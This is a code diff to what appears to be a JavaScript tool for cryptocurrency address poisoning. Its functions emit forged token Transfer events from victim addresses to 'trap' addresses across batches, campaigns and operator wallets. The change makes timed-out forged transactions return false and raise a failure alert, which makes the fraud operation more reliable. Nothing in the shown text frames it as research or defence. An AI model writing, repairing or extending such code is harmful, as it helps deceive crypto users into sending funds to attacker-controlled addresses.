@@ -1346,16 +1346,15 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
 
     if (receiptSuccess) {
       confirmNonceIncrement(campaignId, operatorAddress);
+      logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
+      return hash;
     } else {
-      // 🚀 SELF-HEALING NONCE: If it timed out, it was likely dropped by the node.
-      // Clear the local nonce so the next transaction fetches a fresh one from the network.
       logger.warn(`[mirror] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
+      logger.error(`[mirror] ❌ Transfer timed out and was dropped by the network. tx=${hash}`);
+      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
     }
-
-    logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
-    return hash;
 
   }).catch(err => {
     const errMsg = err.message || String(err);
@@ -1750,16 +1749,15 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     if (receiptSuccess) {
       confirmNonceIncrement(campaignId, operatorAddress);
+      logger.info(`[batch] Forged batch emitted via ${contractAddress.slice(0, 10)}...: ${froms.length} transfers, tx=${hash}`);
+      return hash;
     } else {
-      // 🚀 SELF-HEALING NONCE: If it timed out, it was likely dropped by the node.
-      // Clear the local nonce so the next transaction fetches a fresh one from the network.
       logger.warn(`[batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
+      logger.error(`[batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
+      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
     }
-
-    logger.info(`[batch] Forged batch emitted via ${contractAddress.slice(0, 10)}...: ${froms.length} transfers, tx=${hash}`);
-    return hash;
   }).catch(err => {
     const errMsg = err.message || String(err);
 
@@ -1964,14 +1962,15 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
 
     if (receiptSuccess) {
       confirmNonceIncrement(campaignId, operatorAddress);
+      logger.info(`[multi-batch] Multi-token batch emitted: ${totalTransfers} transfers across ${calls.length} tokens, tx=${hash}`);
+      return hash;
     } else {
       logger.warn(`[multi-batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
+      logger.error(`[multi-batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
+      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
     }
-
-    logger.info(`[multi-batch] Multi-token batch emitted: ${totalTransfers} transfers across ${calls.length} tokens, tx=${hash}`);
-    return hash;
   }).catch(err => {
     const errMsg = err.message || String(err);
 
